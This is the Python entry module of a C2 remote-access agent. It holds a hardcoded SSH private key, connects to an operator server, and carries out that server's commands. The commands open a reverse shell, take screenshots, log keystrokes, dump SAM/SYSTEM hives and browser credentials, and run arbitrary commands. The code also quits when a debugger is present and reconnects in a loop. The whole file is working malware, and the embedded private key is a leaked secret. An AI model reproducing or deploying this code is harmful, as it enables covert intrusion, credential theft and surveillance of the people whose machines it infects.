"""
Agent C2 - Main Entry Point
Simple dispatcher to tools
"""
import sys
import time
import threading
import paramiko
import io

from .config import Config
from .utils import Logger, is_debugger_present

from .tools import reverse_shell, execute_command, check_privileges, get_sam_system_hives
from .tools.screenshot import take_screenshot
from .tools.keylogger import keylogger_action
from .tools.destroy import destroy_agent
from .tools.creds_navigator import get_creds_navigator

class C2Agent:
    """C2 Agent with modular dispatcher"""
    
    def __init__(self, config: Config, logger: Logger):
        self.config = config
        self.logger = logger
        self.ssh_client = None
        self.is_running = False
        self.retry_count = 0
        
        self.private_key_str = """-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEA5O4nGYNyul41tkcCnbfNRXpS+zbP0wP4x5kNjbRApb6a4aiFU14f
dcAplZAPjG/hApuv9uTv1CRROEJONLy42HU9Oqqg5CwU9xezUk8vV4c2qM5eWew5AWxcYY
Pt+l/CZBk6tdt5jci3nWzy6UO7mPxV0LLD4aB9/KRgl/CvdFaKbe2T4mPuZLLKRIV2eHnD
U4tIebphXR9JMvzVJTpGxwRFujorHI9O9ZF4gIVM9Zz2LNG1hZqDzRBtkwRW370GV3cfBt
sKy16u2veqwiR6bSI0EwBzEOh/OealtUujKlZ5aj/JAiar7Ip8Zj7Rxj9yu727pZWb2+w2
RTF9e/m17wAAA9isikygrIpMoAAAAAdzc2gtcnNhAAABAQDk7icZg3K6XjW2RwKdt81Fel
L7Ns/TA/jHmQ2NtEClvprhqIVTXh91wCmVkA+Mb+ECm6/25O/UJFE4Qk40vLjYdT06qqDk
LBT3F7NSTy9Xhzaozl5Z7DkBbFxhg+36X8JkGTq123mNyLedbPLpQ7uY/FXQssPhoH38pG
CX8K90Vopt7ZPiY+5ksspEhXZ4ecNTi0h5umFdH0ky/NUlOkbHBEW6Oiscj071kXiAhUz1
nPYs0bWFmoPNEG2TBFbfvQZXdx8G2wrLXq7a96rCJHptIjQTAHMQ6H855qW1S6MqVnlqP8
kCJqvsinxmPtHGP3K7vbullZvb7DZFMX17+bXvAAAAAwEAAQAAAQACGP6JuM8dzwwt8eOf
v1Xlq5PEEoH//HrUlV3u7PZkrmTr6WfjViryoMKgyLOjxUiqBfQsTne2GWkXG2BtEkedUC
Gx/ms/+/lrNC/j8q7L3gTNsipiJ4x0K2KDUDqnfyYgVazYirzH5E1uZ1eodILtCW7d3S13
TUmqPXVXHxD0f2wQbFvRMPOrmkxKK/GgscAbssb0ZOZZ7bH42420qpn23hFLNWluE/R5Sg
QmZdYfTF3RXeIwgVHsw6shc4XYFeiPgEmzv36UjhrM+4RTh3chLBPV2kLl41+NaHE4qghs
X2IXBvIw0m7cSCszmuI5ZUvVxUndfV9NI1mHOWT+SK0ZAAAAgBvErei6NtfeMujZ2MmwnV
EErDu7VMn2Ye2niMZ1b7tImXRXDF4CoGVZi13MvkolyeUTYYhSPUjEoxKkwOGzRvSh/rYi
IiBKHnQ36NQvhvQMtPKjsRw8cIHLnQVVF6XV8abIuDG4mIfrV44Q6x8sic7j1jt+cpPaqd
bcBTpFxUx1AAAAgQD160egLe61n+wQDHt/uEKId/hcRSJ9jeoKQjaQ2E0aCYcd/D1y/Wm3
NzvxfsiKwnUXV0whEv+reTqxnoOM6NFQT0XIvHoFPeUf+u6BszKaLSVp4Xl6VWqLHG2B8p
iPhnxQlFxbO1boDGXbg3kENwFq096naDU29nplJLr4n36wdwAAAIEA7lCW7bcdP1ps0lGE
nSqh5FadFsN4PPtPuDQe6Z2U32DAqChDpBbiABXyAnXpudROZvDu2tYk//BAW1gxy5+h5Z
qx/xg0HniBuDCvt20/nDHUtpzqnySs34hEONFMgvKW0XrbBdsCNIsU3Kp2lPRE93bYoGCo
vjQ/cPZKhCVOvEkAAAAeam9leUBNYWNCb29rLUFpci1kZS1qb2V5LmxvY2FsAQIDBAU=
-----END OPENSSH PRIVATE KEY-----"""

    def _get_private_key(self):
        """Load the SSH private key"""
        try:
            return paramiko.RSAKey.from_private_key(io.StringIO(self.private_key_str))
        except Exception as e:
            self.logger.error(f"Failed to load key: {e}")
            return None

    def connect(self) -> bool:
        """Establish the SSH connection"""
        try:
            self.ssh_client = paramiko.SSHClient()
            self.ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            print(f"[*] Connecting to {self.config.server_ip}:{self.config.server_port}...", file=sys.stderr)
            
            key = self._get_private_key()
            if not key:
                return False

            self.ssh_client.connect(
                hostname=self.config.server_ip,
                port=self.config.server_port,
                username="joey",
                pkey=key,
                look_for_keys=False,
                timeout=15
            )
            
            print("[+] Connected!", file=sys.stderr)
            self.retry_count = 0
            return True
            
        except Exception as e:
            print(f"[!] Connection error: {e}", file=sys.stderr)
            return False

    def handle_command(self, channel, command: str):
        """
        Main dispatcher - Routes commands to appropriate tools
        Response format: COMMAND --- RESULT
        """
        cmd = command.strip()
        if not cmd:
            return

        print(f"[Agent] Command received: {cmd}", file=sys.stderr)
        self.logger.info(f"Command received: {cmd}")
        
        parts = cmd.split()
        cmd_type = parts[0].upper()
        params = parts[1:] if len(parts) > 1 else []
        
        result = ""
        
        if cmd_type == "SHELL":
            port = int(params[0]) if params else 4444
            response = f"{cmd} --- SUCCESS: Reverse shell initiated on port {port}\n"
            self._send_response(channel, response)
            print(f"[*] Launching reverse shell to {self.config.server_ip}:{port}", file=sys.stderr)
            threading.Thread(
                target=reverse_shell,
                args=(self.config.server_ip, port),
                daemon=True
            ).start()
            return
        
        elif cmd_type == "SCREENSHOT":
            result = self._handle_screenshot()
        
        elif cmd_type == "KEYLOG":
            action = params[0] if params else "START"
            result = keylogger_action(action)
        
        elif cmd_type == "PRIVESC":
            result = check_privileges()

        elif cmd_type == "CREDS":
            if params and params[0] == "hash":
                result = self._handle_creds_hives()
            elif params and params[0] == "navigator":
                result = get_creds_navigator()
            else:
                result = "Error: Invalid creds type (use: hash or navigator)"
        
        elif cmd_type == "EXIT" or cmd_type == "QUIT":
            self.is_running = False
            result = "Exiting..."
        
        elif cmd_type == "DESTROY":
            result = "DESTROYING AGENT..."
            response = f"{cmd} --- {result}\n"
            self._send_response(channel, response)
            self.is_running = False
            
            try:
                destroy_results = destroy_agent()
                import time
                time.sleep(3)
                
                if sys.platform == 'win32':
                    try:
                        import win32serviceutil
                        SERVICE_NAME = "AmineIsBack"
                        win32serviceutil.QueryServiceStatus(SERVICE_NAME)
                        print("[Destroy] WARNING: Service still exists!", file=sys.stderr)
                    except Exception:
                        print("[Destroy] Service confirmed uninstalled", file=sys.stderr)
            except Exception as e:
                print(f"[Destroy] Error destroy_agent: {e}", file=sys.stderr)
                import traceback
                traceback.print_exc(file=sys.stderr)
            
            if self.ssh_client:
                try:
                    self.ssh_client.close()
                except:
                    pass
            
            print("[!] Agent destroyed, stopping process...", file=sys.stderr)
            sys.exit(0)
        
        elif cmd_type == "CMD":
            if params:
                command_to_run = " ".join(params)
                print(f"[Agent] Executing CMD: {command_to_run}", file=sys.stderr)
                result = execute_command(command_to_run)
            else:
                result = "Error: CMD requires a command parameter"
        
        else:
            print(f"[Agent] Unrecognized flag: {cmd_type}", file=sys.stderr)
            result = f"Error: Unknown command '{cmd_type}'. Available: SHELL, CMD, SCREENSHOT, KEYLOG, PRIVESC, CREDS, EXIT, DESTROY"
        
        response = f"{cmd} --- {result}\n"
        self._send_response(channel, response)
    
    def _send_response(self, channel, response: str):
        """Send a response to the server via the SSH channel"""
        print(f"[Agent] Sending response: {response[:100]}...", file=sys.stderr)
        try:
            data = response.encode('utf-8') if isinstance(response, str) else response
            channel.sendall(data)
            print(f"[Agent] Successfully sent {len(data)} bytes", file=sys.stderr)
        except Exception as e:
            print(f"[Agent] Send error: {e}", file=sys.stderr)
            import traceback
            traceback.print_exc(file=sys.stderr)
    
    def _handle_screenshot(self) -> str:
        """Capture screenshot, encode in base64 and return the data"""
        import os
        import base64

        success, filepath_or_error, dimensions = take_screenshot()
        if not success:
            return filepath_or_error
        local_path = filepath_or_error
        try:
            with open(local_path, 'rb') as f:
                image_data = f.read()
            b64_data = base64.b64encode(image_data).decode('ascii')
            b64_data = b64_data.replace('\n', '').replace('\r', '')
            ext = os.path.splitext(local_path)[1].lower().replace('.', '')
            os.remove(local_path)
            print(f"[Agent] Screenshot deleted: {local_path}", file=sys.stderr)
            return f"SUCCESS|{dimensions}|{ext}|{b64_data}"
        except Exception as e:
            print(f"[Agent] Screenshot encoding error: {e}", file=sys.stderr)
            return f"Error: Failed to encode screenshot - {str(e)}"

    def _handle_creds_hives(self) -> str:
        """Retrieve SAM and SYSTEM .hive, encode in base64 and return (same logic as screenshot)."""
        import os
        import base64

        success, files_or_error = get_sam_system_hives()
        if not success:
            return "Error: %s" % files_or_error
        parts = []
        try:
            for path, name in files_or_error:
                with open(path, 'rb') as f:
                    data = f.read()
                b64 = base64.b64encode(data).decode('ascii')
                b64 = b64.replace('\n', '').replace('\r', '')
                parts.append("%s|hive|%s" % (name, b64))
                os.remove(path)
                print(f"[Agent] Hive deleted: {path}", file=sys.stderr)
            return "SUCCESS||" + "||".join(parts)
        except Exception as e:
            for path, _ in files_or_error:
                if os.path.exists(path):
                    try:
                        os.remove(path)
                    except Exception:
                        pass
            return "Error: Failed to encode hives - %s" % e

    def run(self):
        """Main agent loop"""
        print(f"[*] Agent started - Target: {self.config.server_ip}:{self.config.server_port}", file=sys.stderr)
        
        if is_debugger_present():
            print("[!] Debugger detected, stopping", file=sys.stderr)
            sys.exit(1)
        
        self.is_running = True
        max_retries = self.config.get("agent", "max_retries", -1)
        
        while self.is_running:
            if max_retries > 0 and self.retry_count >= max_retries:
                break
            
            if self.connect():
                try:
                    transport = self.ssh_client.get_transport()
                    channel = transport.open_session()
                    
                    channel.exec_command("READY")
                    
                    print("[+] Session opened, testing send...", file=sys.stderr)
                    test_msg = "AGENT_READY --- Waiting for instructions...\n"
                    channel.sendall(test_msg.encode('utf-8'))
                    print(f"[Agent] Test message sent: {test_msg.strip()}", file=sys.stderr)
                    
                    print("[+] Waiting for commands...", file=sys.stderr)
                    buffer = ""
                    
                    while self.is_running and not channel.closed:
                        if channel.recv_ready():
                            data = channel.recv(4096).decode('utf-8', errors='ignore')
                            if not data:
                                print("[Agent] Connection closed by server", file=sys.stderr)
                                break
                            
                            print(f"[Agent] Data received: {data.strip()}", file=sys.stderr)
                            buffer += data
                            while '\n' in buffer:
                                line, buffer = buffer.split('\n', 1)
                                if line.strip():
                                    self.handle_command(channel, line)
                        
                        time.sleep(0.1)
                        
                except Exception as e:
                    print(f"[!] Session error: {e}", file=sys.stderr)
                finally:
                    if self.ssh_client:
                        self.ssh_client.close()
            
            if self.is_running:
                self.retry_count += 1
                print(f"[*] Retry {self.retry_count} in {self.config.reconnect_delay}s...", file=sys.stderr)
                time.sleep(self.config.reconnect_delay)

    def disconnect(self):
        """Clean disconnect"""
        self.is_running = False
        if self.ssh_client:
            try:
                self.ssh_client.close()
            except:
                pass


def run_agent():
    """Agent entry point"""
    config = Config()
    logger = Logger(enabled=config.get("debug", "enabled", False))
    
    agent = C2Agent(config, logger)
    agent.run()


if __name__ == "__main__":
    run_agent()
